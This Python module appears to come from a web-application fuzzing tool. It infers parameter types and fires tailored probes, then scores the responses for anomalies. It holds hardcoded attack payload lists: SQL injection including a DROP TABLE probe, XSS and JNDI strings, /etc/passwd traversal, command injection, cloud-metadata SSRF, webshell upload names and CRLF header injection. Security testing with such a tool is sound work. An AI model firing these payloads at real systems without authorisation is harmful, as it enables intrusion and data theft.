from __future__ import annotations

"""Smart fuzzer v2: context-aware payloads + semantic anomaly scoring.

Unlike v1 (blind byte-diff against a baseline), v2 *infers the type* of each
parameter from its name and current value and fires *type-tailored* payloads.
Classification is *semantic*: each anomalous response is scored on several
independent axes (status transition, error/stack-trace leak, reflected
payload, auth-cookie issuance, structural/entropy delta, redirect change,
new header surface) so a real difference is never missed because the body
happened to stay 85% similar.

The engine is still zero-config: ``build_variants(req)`` needs nothing from
the user. It slots straight into the existing ``run_fuzz`` dispatch path.
"""

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher

from . import mutate as _mutate
from .engine import execute
from .models import NameValue, Request, Response, SessionState
from .mutate import Mutation
from .state_fields import is_state_field

# ------------------------------------------------------------------ payload sets
BOOLEAN_VALUES = {"true", "false", "1", "0", "yes", "no", "on", "off"}
SQL_PROBES = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
]
XSS_PROBES = [
    "<script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    "${jndi:ldap://x/}",
    "';alert(1)//",
    "<img src=x onerror=alert(1)>",
]
PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
COMMAND_INJECTION = [
    ";id",
    "|id",
    "$(id)",
    "`id`",
    "&& whoami",
]
SSRF_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://[::1]/",
    "file:///etc/passwd",
]
LDAP_PROBES = ["*)(uid=*))(|(uid=*", "*)(&(objectClass=*"]

BOUNDARY_IDS = ["0", "-1", "9999999999", "1e9", "NaN", "0000001", "1.0", "2**31"]
TYPE_CONFUSION_WORDS = [
    "abc",
    "root",
    "admin",
    "NaN",
    "null",
    "true",
    "[]",
    "{}",
    "-1",
    "1e9",
]
EMAIL_PROBES = ["a@b.c", "test@test.com", "root@localhost", "not-an-email"]
FILENAME_PROBES = [
    "shell.php",
    "shell.php5",
    "shell.phtml",
    "shell.jpg.php",
    "shell.PHP",
    "../../shell.php",
    "shell.asp",
    "shell.jsp",
    "shell.aspx",
]

ERROR_PATTERNS = [
    r"Traceback \(most recent call last\)",
    r"SQL syntax",
    r"You have an error in your SQL",
    r"Fatal error",
    r"Unhandled Exception",
    r"Undefined variable",
    r"syntax error",
    r"java\.lang\.",
    r"NullPointerException",
    r"Stack trace",
    r"Exception in thread",
    r"OSError",
    r"Permission denied",
    r"call to undefined function",
    r"Warning: .* on line [0-9]+",
    r"pg_query\(\)",
    r"mysql_fetch",
    r"ORA-[0-9]{5}",
    r"Microsoft SQL Server",
    r"Incorrect syntax near",
]
AUTH_COOKIE = re.compile(r"token|jwt|auth|remember|apikey|api_key", re.IGNORECASE)
SESSION_COOKIE = re.compile(
    r"session|jsessionid|phpsessid|aspsession|cfid|cftoken", re.IGNORECASE
)
_REFLECT_RE = re.compile(r"[<>\"]|&#?[a-zA-Z0-9]+;|\\u00|%[0-9a-fA-F]{2}")


# ------------------------------------------------------------------ inference
def _looks_numeric(v: str) -> bool:
    v = v.strip()
    if not v:
        return False
    try:
        float(v)
        return True
    except ValueError:
        return False


def _looks_email(v: str) -> bool:
    return bool(re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", v.strip()))


def _looks_filename(v: str) -> bool:
    v = v.strip()
    if "/" in v or "\\" in v:
        return True
    return bool(re.search(r"\.[a-zA-Z0-9]{1,5}$", v)) and len(v) < 80


def _looks_path(v: str) -> bool:
    v = v.strip()
    # traversal or absolute path, or a path with directory separators
    return bool(
        v.startswith(("/", "./", "../", ".\\", "..\\")) or "/" in v or "\\" in v
    )


_NUMERIC_NAMES = {
    "id",
    "user_id",
    "uid",
    "account",
    "account_id",
    "page",
    "offset",
    "limit",
    "num",
    "count",
    "index",
    "pid",
    "post",
    "product",
    "item",
    "order",
    "ref",
    "category_id",
    "parent",
    "child",
    "start",
    "end",
    "year",
    "month",
    "day",
}
_BOOL_NAMES = {
    "admin",
    "debug",
    "active",
    "enabled",
    "disabled",
    "show",
    "hide",
    "flag",
    "is_",
    "has_",
    "can_",
}
_STRING_NAMES = {
    "q",
    "search",
    "name",
    "username",
    "user",
    "input",
    "term",
    "category",
    "type",
    "filter",
    "tag",
    "sort",
    "status",
    "group",
    "title",
    "text",
    "query",
    "keyword",
    "email",
    "mail",
    "comment",
    "message",
    "description",
    "firstname",
    "lastname",
    "city",
    "country",
    "address",
    "phone",
    "url",
    "redirect",
    "return",
    "next",
    "file",
    "filename",
    "path",
    "host",
}
_FILE_NAMES = {
    "file",
    "filename",
    "upload",
    "attachment",
    "image",
    "avatar",
    "photo",
    "doc",
}
_EMAIL_NAMES = {"email", "mail", "e-mail", "username"}
_PATH_NAMES = {
    "path",
    "dir",
    "directory",
    "template",
    "include",
    "page",
    "view",
    "redirect",
    "url",
    "return",
    "next",
    "host",
    "domain",
}
_LDAP_NAMES = {"user", "username", "login", "cn", "dn", "uid"}

# classification weights for semantic scoring
_ANOMALY_WEIGHT = {
    "status_change": 3,
    "error_leak": 5,
    "sql_error": 5,
    "reflected_payload": 4,
    "new_auth_cookie": 4,
    "new_header_surface": 2,
    "structural_change": 3,
    "body_changed": 2,
    "redirect_change": 3,
    "request_error": 2,
    "timeout": 1,
}


def _infer_type(name: str, value: str) -> str:
    n = name.lower()
    if value.lower() in BOOLEAN_VALUES or any(n.startswith(b) for b in _BOOL_NAMES):
        return "boolean"
    if _looks_email(value) or n in _EMAIL_NAMES:
        return "email"
    # url/host/redirect fields (may contain slashes) win before the path check
    if n in {"redirect", "return", "next", "url", "host", "domain"} or value.startswith(
        ("http://", "https://", "ftp://", "//")
    ):
        return "url"
    # path-like values (traversal / absolute) must win before the filename check
    if n in _PATH_NAMES or _looks_path(value):
        return "path"
    if n in _FILE_NAMES or _looks_filename(value):
        return "filename"
    if _looks_numeric(value) or n in _NUMERIC_NAMES:
        return "numeric"
    if n in _STRING_NAMES or n in _LDAP_NAMES:
        return "string"
    return "generic"


# ------------------------------------------------------------------ variant builder
def build_variants(
    req: Request, include_state_fields: bool = False
) -> list[tuple[str, Request, list[str]]]:
    """Return [(label, mutated_request, descriptions), ...] for smart defaults.

    v2: payloads are chosen by the *inferred type* of each parameter, so a
    numeric `id` gets boundary/type-confusion probes while a `q` gets
    SQL/XSS/command-injection probes and an `email` field gets mail-specific
    fuzzing. This produces far fewer, far more relevant variants than v1.
    """
    variants: list[tuple[str, Request, list[str]]] = []
    all_params: list[NameValue] = [
        p
        for p in list(req.params) + list(req.body_form)
        if include_state_fields or not is_state_field(p.name)
    ]
    seen_labels = set()

    def add(label: str, ops: list[Mutation]):
        if label in seen_labels:
            return
        seen_labels.add(label)
        mreq, desc = _mutate.apply_mutations(req, ops)
        variants.append((label, mreq, desc))

    for p in all_params:
        ptype = _infer_type(p.name, p.value)

        if ptype == "boolean":
            if p.value.lower() in BOOLEAN_VALUES:
                add(f"flip:{p.name}", [Mutation("flip_param", name=p.name)])

        elif ptype == "numeric":
            for w in TYPE_CONFUSION_WORDS[:3]:
                add(
                    f"type-confuse:{p.name}={w}",
                    [Mutation("set_param", name=p.name, value=w)],
                )
            for b in BOUNDARY_IDS:
                add(
                    f"boundary:{p.name}={b}",
                    [Mutation("set_param", name=p.name, value=b)],
                )

        elif ptype == "email":
            for e in EMAIL_PROBES:
                add(
                    f"email:{p.name}={e}", [Mutation("set_param", name=p.name, value=e)]
                )

        elif ptype == "filename":
            for f in FILENAME_PROBES:
                add(
                    f"upload:{p.name}={f}",
                    [Mutation("set_param", name=p.name, value=f)],
                )

        elif ptype == "path":
            for t in PATH_TRAVERSAL:
                add(
                    f"traversal:{p.name}", [Mutation("set_param", name=p.name, value=t)]
                )
            for f in FILENAME_PROBES:
                add(
                    f"upload:{p.name}={f}",
                    [Mutation("set_param", name=p.name, value=f)],
                )

        elif ptype == "url":
            for s in SSRF_PROBES:
                add(f"ssrf:{p.name}", [Mutation("set_param", name=p.name, value=s)])

        elif ptype == "string":
            for sq in SQL_PROBES:
                add(f"sql:{p.name}", [Mutation("set_param", name=p.name, value=sq)])
            for x in XSS_PROBES:
                add(f"xss:{p.name}", [Mutation("set_param", name=p.name, value=x)])
            for c in COMMAND_INJECTION:
                add(f"cmdi:{p.name}", [Mutation("set_param", name=p.name, value=c)])
            if p.name.lower() in _LDAP_NAMES:
                for l in LDAP_PROBES:
                    add(f"ldap:{p.name}", [Mutation("set_param", name=p.name, value=l)])

        else:  # generic
            for sq in SQL_PROBES[:2]:
                add(f"sql:{p.name}", [Mutation("set_param", name=p.name, value=sq)])
            for x in XSS_PROBES[:2]:
                add(f"xss:{p.name}", [Mutation("set_param", name=p.name, value=x)])

    # header-level injection probes (work regardless of params)
    add(
        "header-crlf",
        [
            Mutation(
                "set_header", name="X-Forwarded-For", value="127.0.0.1\r\nX-Injected: 1"
            )
        ],
    )
    # broken-auth check
    add("strip-session", [Mutation("strip_session")])
    return variants


# ------------------------------------------------------------------ semantic scoring
def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    freq: dict[str, int] = {}
    for ch in s:
        freq[ch] = freq.get(ch, 0) + 1
    import math

    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


def _structure_hash(s: str) -> int:
    """Coarse structural signature: tag/key sequence, ignoring values."""
    toks = re.findall(
        r"</?[a-zA-Z][\w-]*>|[\{\}\[\],:]|[A-Za-z_][A-Za-z0-9_]*\s*[:=]|[0-9]+", s
    )
    return hash(" ".join(toks[:200]))


def _classify(
    label: str, baseline: Response | None, resp: Response | None, error: str | None
) -> dict | None:
    if error:
        return {
            "label": label,
            "anomaly": "request_error",
            "detail": error,
            "severity": _ANOMALY_WEIGHT["request_error"],
        }
    if resp is None:
        return None

    base_status = baseline.status_code if baseline else None
    out = {
        "label": label,
        "status": resp.status_code,
        "body_len": resp.body_len,
        "anomalies": [],
    }

    # 1. status transition
    if base_status is not None and resp.status_code != base_status:
        out["anomalies"].append("status_change")
        out["detail"] = f"baseline {base_status} -> {resp.status_code}"

    # 2. error / stack-trace leak
    body = resp.body or ""
    matched_err = None
    for pat in ERROR_PATTERNS:
        if re.search(pat, body):
            matched_err = pat[:40]
            break
    if matched_err:
        out["anomalies"].append("error_leak")
        if re.search(
            r"SQL syntax|ORA-|pg_query|mysql_|SQL Server|Incorrect syntax",
            body,
            re.IGNORECASE,
        ):
            out["anomalies"].append("sql_error")
        out.setdefault("detail", f"error pattern matched: {matched_err}")

    # 3. reflected payload (XSS / injection echo)
    refl = _detect_reflection(label, body)
    if refl:
        out["anomalies"].append("reflected_payload")
        out.setdefault("detail", f"payload reflected: {refl}")

    # 4. new auth token / credential cookie
    base_cookies = {c.name for c in (baseline.set_cookies if baseline else [])}
    for c in resp.set_cookies:
        if AUTH_COOKIE.search(c.name) and c.name not in base_cookies:
            out["anomalies"].append("new_auth_cookie")
            out.setdefault("detail", f"new cookie {c.name}=")
            break

    # 5. session rotation on strip-session
    if label == "strip-session":
        for c in resp.set_cookies:
            if SESSION_COOKIE.search(c.name) and c.name not in base_cookies:
                out["anomalies"].append("new_auth_cookie")
                out.setdefault("detail", f"new session cookie {c.name}=")
                break

    # 6. new header surface
    if baseline is not None:
        base_hdr = {h.name.lower() for h in baseline.headers}
        new_hdr = [h.name for h in resp.headers if h.name.lower() not in base_hdr]
        if new_hdr:
            out["anomalies"].append("new_header_surface")
            out.setdefault("detail", "new header(s): " + ", ".join(new_hdr[:5]))

    # 7. redirect change
    if baseline is not None:
        base_loc = _location(baseline)
        loc = _location(resp)
        if base_loc != loc and (base_loc or loc):
            out["anomalies"].append("redirect_change")
            out.setdefault("detail", f"location {base_loc} -> {loc}")

    # 8. structural / entropy delta (semantic, not blind byte-diff)
    if baseline is not None and baseline.body:
        base_body = baseline.body
        resp_body = resp.body or ""
        if base_body == resp_body:
            sim = 1.0
        elif not resp_body:
            sim = 0.0
        else:
            sim = SequenceMatcher(None, base_body[:4000], resp_body[:4000]).ratio()
        struct_changed = _structure_hash(base_body) != _structure_hash(resp_body)
        ent_delta = abs(_shannon_entropy(base_body) - _shannon_entropy(resp_body))
        if struct_changed and sim < 0.85:
            out["anomalies"].append("structural_change")
            out.setdefault(
                "detail",
                f"structure changed (similarity {sim:.2f}, base {baseline.body_len}B -> {resp.body_len}B)",
            )
        elif sim < 0.7 or ent_delta > 1.5:
            out["anomalies"].append("body_changed")
            out.setdefault(
                "detail",
                f"similarity {sim:.2f}, entropy Δ {ent_delta:.2f} "
                f"(base {baseline.body_len}B -> {resp.body_len}B)",
            )

    if not out["anomalies"]:
        return None

    # severity = max weight across detected anomalies; primary anomaly = highest severity
    out["anomaly"] = max(out["anomalies"], key=lambda a: _ANOMALY_WEIGHT.get(a, 1))
    out["severity"] = _ANOMALY_WEIGHT.get(out["anomaly"], 1)
    out["anomalies"] = sorted(set(out["anomalies"]))
    return out


def _location(resp: Response) -> str:
    for h in resp.headers:
        if h.name.lower() == "location":
            return h.value
    return ""


def _detect_reflection(label: str, body: str) -> str | None:
    payload_marker = label.split(":", 1)[-1] if ":" in label else ""
    # for xss/cmdi probes we look for echoed special chars / script
    probes = XSS_PROBES + COMMAND_INJECTION + SQL_PROBES + PATH_TRAVERSAL
    for p in probes:
        if p in body:
            return p[:40]
    if payload_marker and len(payload_marker) > 2 and payload_marker in body:
        return payload_marker[:40]
    return None


def run_fuzz(
    req: Request,
    session: SessionState,
    *,
    baseline_response: Response | None = None,
    concurrency: int = 6,
    variants: list[tuple[str, Request, list[str]]] | None = None,
    include_state_fields: bool = False,
) -> dict:
    """Dispatch variants and return semantic anomalies + summary."""
    if variants is None:
        variants = build_variants(req, include_state_fields=include_state_fields)

    if baseline_response is None:
        try:
            _, baseline_response, _ = execute(req, session.model_copy(deep=True))
        except Exception:  # noqa: BLE001
            baseline_response = None

    def _do(item):
        label, mreq, desc = item
        try:
            _, resp, _ = execute(mreq, session.model_copy(deep=True))
            return label, desc, resp, None
        except Exception as exc:  # noqa: BLE001
            return label, desc, None, str(exc)

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=max(1, min(concurrency, 24))) as ex:
        futures = {ex.submit(_do, v): v[0] for v in variants}
        for fut in as_completed(futures):
            label, desc, resp, err = fut.result()
            c = _classify(label, baseline_response, resp, err)
            if c is not None:
                c["mutations"] = desc
                results.append(c)

    results.sort(key=lambda r: (-r.get("severity", 0), r.get("label") or ""))
    return {
        "target": req.url,
        "total_variants": len(variants),
        "anomalies": len(results),
        "baseline_status": baseline_response.status_code if baseline_response else None,
        "results": results,
    }
